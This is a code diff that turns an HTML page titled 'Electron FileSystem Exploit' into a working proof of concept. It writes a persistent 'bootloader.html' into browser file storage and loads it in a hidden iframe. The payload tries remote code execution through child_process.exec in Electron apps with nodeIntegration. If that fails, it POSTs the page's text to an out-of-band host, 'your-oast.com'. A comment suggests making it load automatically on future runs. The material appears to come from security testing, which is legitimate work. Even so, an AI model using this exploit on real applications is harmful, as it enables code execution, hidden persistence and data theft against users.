@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html>
 <head>
   <title>Electron FileSystem Exploit</title>
@@ -43,3 +43,37 @@
   </script>
 </body>
 </html>
+ -->
+
+<script>
+webkitRequestFileSystem(PERSISTENT, 1024 * 1024, function(fs) {
+  fs.root.getFile('bootloader.html', { create: true }, function(fileEntry) {
+    fileEntry.createWriter(function(writer) {
+      const payload = `
+        <style>*{all:unset!important;color:red;font-size:30px}</style>
+        <script>
+          // RCE for Electron with nodeIntegration
+          try {
+            require('child_process').exec('open -a Calculator');
+          } catch (e) {
+            // fallback to token exfiltration
+            fetch('https://your-oast.com/xss', {
+              method: 'POST',
+              body: document.body.innerText
+            });
+          }
+        <\/script>
+      `;
+      writer.write(new Blob([payload], { type: 'text/html' }));
+      writer.onwriteend = function() {
+        // load file now (auto-load on future runs can be triggered via injected preload or component)
+        const url = fileEntry.toURL();
+        const iframe = document.createElement('iframe');
+        iframe.src = url;
+        iframe.style = "width:0;height:0;display:none";
+        document.body.appendChild(iframe);
+      };
+    });
+  });
+});
+</script>
